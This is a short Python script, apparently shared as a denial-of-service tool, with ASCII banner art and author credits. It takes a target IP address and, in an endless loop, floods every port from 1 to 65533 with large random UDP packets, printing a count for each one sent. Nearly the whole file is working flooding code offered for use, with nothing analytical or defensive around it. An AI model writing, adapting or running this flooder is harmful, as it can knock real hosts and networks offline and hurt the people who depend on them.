#Author Xisz77DotMy'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(78300)

os.system("clear")
print(" ")
print("$$\   $$\  $$$$$$\       $$$$$$$$\ $$$$$$$$\ ")
print("$$ |  $$ |$$  __$$\      \____$$  |\____$$  |")
print("\$$\ $$  |$$ /  \__|         $$  /     $$  / ")
print(" \$$$$  / \$$$$$$\ $$$$$$\  $$  /     $$  /  ")
print(" $$  $$<   \____$$\\______|$$  /     $$  /   ")
print("$$  /\$$\ $$\   $$ |      $$  /     $$  /    ")
print("$$ /  $$ |\$$$$$$  |     $$  /     $$  /     ")
print("\__|  \__| \______/      \__/      \__/      ")
print("Get Ip From Domain? use python ipfromdomain.py")
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : An0n K4ndar" + N + "   XS-77 DOS From - " + B + "" + R + "K4ndar" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : An0nK4ndar\033[0m")
print("\033[33mGithub 	       : https://github.com/An0nK4ndar/\033[0m")
print("\033[33mTelegram       : https://t.me/Xisz77DotMy\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] Target's IP : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
